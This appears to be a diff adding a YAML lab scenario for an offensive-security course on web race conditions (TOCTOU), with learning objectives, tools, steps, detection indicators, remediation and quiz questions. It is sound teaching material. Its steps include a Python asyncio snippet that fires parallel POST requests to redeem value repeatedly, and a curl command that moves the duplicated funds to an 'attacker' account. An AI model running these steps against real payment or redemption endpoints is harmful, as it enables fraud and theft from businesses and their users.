@@ -1,0 +1,103 @@
+# Category: Offensive Security - Web
+name: "Race Condition Attacks – TOCTOU and Concurrency Exploits"
+id: "web-race-condition-001"
+category: "offensive_security"
+subcategory: "web_application"
+difficulty: "intermediate"
+estimated_time: "70 minutes"
+
+description: |
+  Exploit race conditions in web applications to perform operations that
+  violate intended logic, such as multiple purchases, gift card abuse,
+  file upload bypass, or privilege escalation. The attack leverages the
+  time-of-check to time-of-use (TOCTOU) window by sending concurrent
+  requests to a vulnerable endpoint.
+
+learning_objectives:
+  - Understand concurrency and race condition concepts
+  - Identify endpoints with race vulnerabilities (e.g., limited‑time offers, file uploads)
+  - Use Burp Turbo Intruder or custom scripts to send parallel requests
+  - Exploit to gain financial or administrative advantage
+
+tools:
+  - Burp Suite (Turbo Intruder)
+  - Python (asyncio, requests)
+  - curl (parallel with `&` or `xargs`)
+  - JMeter
+
+prerequisites:
+  - Web application with state‑changing operations (e.g., balance update, limit checks)
+  - No proper locking or atomic operations
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify vulnerable endpoints"
+    commands:
+      - "# Look for endpoints like /redeem_gift, /transfer, /claim_bonus"
+      - "# Understand the logic: check balance -> deduct balance -> add funds"
+    expected_output: "Endpoint that performs multiple steps without atomicity"
+    detection: "Application logs showing near‑simultaneous requests"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Send concurrent requests to trigger race condition"
+    commands:
+      - "# Using Python asyncio:"
+      - "import asyncio, aiohttp"
+      - "async def attack():"
+      - "    async with aiohttp.ClientSession() as session:"
+      - "        tasks = [session.post(url, data={'amount':100}) for _ in range(20)]"
+      - "        await asyncio.gather(*tasks)"
+      - "# Or use Burp Turbo Intruder with parallel threads"
+    expected_output: "Balance increased more than intended (e.g., multiple redemptions)"
+    detection: "Database logs with multiple updates in same millisecond"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate gained value or access"
+    commands:
+      - "# After gaining funds/access, transfer to another account"
+      - "curl -X POST /transfer -d 'to=attacker&amount=1000'"
+    expected_output: "Successful transfer of duplicated value"
+    detection: "Suspicious financial transactions; audit logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1499"
+    description: "Endpoint Denial of Service (race conditions can cause DoS)"
+  - standard: "OWASP"
+    control: "A04:2021"
+    description: "Insecure Design"
+
+detection:
+  network_indicators:
+    - "Many identical requests from same IP in short time (<100ms)"
+  log_indicators:
+    - "Application logs with timestamps showing collisions"
+    - "Database deadlock or lock‑wait timeouts"
+  endpoint_indicators:
+    - "High CPU usage due to contention"
+
+remediation:
+  immediate:
+    - "Implement pessimistic or optimistic locking (e.g., `SELECT ... FOR UPDATE`)"
+    - "Use idempotency keys to prevent duplicate processing"
+  long_term:
+    - "Design operations as atomic transactions"
+    - "Throttle requests per IP or user"
+
+variables:
+  target_url: "https://example.com/api/redeem"
+  redemption_id: "gift123"
+
+assessment_questions:
+  - "What is the difference between a race condition and a TOCTOU vulnerability?"
+  - "How can idempotency keys mitigate race conditions?"
+  - "What is an example of a race condition in e‑commerce?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/Race_conditions"
+    title: "OWASP Race Conditions"
+  - url: "https://portswigger.net/web-security/race-conditions"
+    title: "PortSwigger - Race Conditions"
